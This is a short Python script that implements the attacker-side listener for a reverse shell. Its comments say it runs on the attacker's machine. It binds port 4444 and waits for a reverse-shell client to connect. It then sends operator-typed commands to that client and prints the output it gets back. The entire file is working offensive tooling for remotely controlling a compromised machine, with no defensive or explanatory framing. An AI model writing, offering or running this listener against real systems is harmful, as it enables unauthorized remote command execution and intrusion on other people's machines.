from socket import *

# Define the IP and port for the server (attacker's machine)
SERVER_IP = "0.0.0.0"  # Listens on all available network interfaces
SERVER_PORT = 4444     # Same port of client Rshell

def start_server():
    # Create a TCP socket
    server_socket = socket(AF_INET, SOCK_STREAM)
    # Allow reuse of the address
    server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
    # Bind the socket to the IP and port
    server_socket.bind((SERVER_IP, SERVER_PORT))
    # Listen for incoming connections
    server_socket.listen(1)
    print(f"Listening on {SERVER_IP}:{SERVER_PORT}...")

    # Accept an incoming connection
    client_socket, client_address = server_socket.accept()
    print(f"Connection established from {client_address}")

    message = client_socket.recv(4096)
    print(message)

    while True:
        # Get the command input from the attacker (server side)
        command = input("Please enter a command: ")

        if command.lower() == "exit":
            # Send the 'exit' command to the client
            client_socket.send("exit".encode())
            break

        # Send the command to the reverse shell client
        client_socket.send(command.encode())

        # Receive the result of the command from the client
        result = client_socket.recv(4096).decode()
        print(result)

    # Shutdown and close connections
    client_socket.shutdown(SHUT_RDWR)
    client_socket.close()
    server_socket.close()

if __name__ == "__main__":
    start_server()
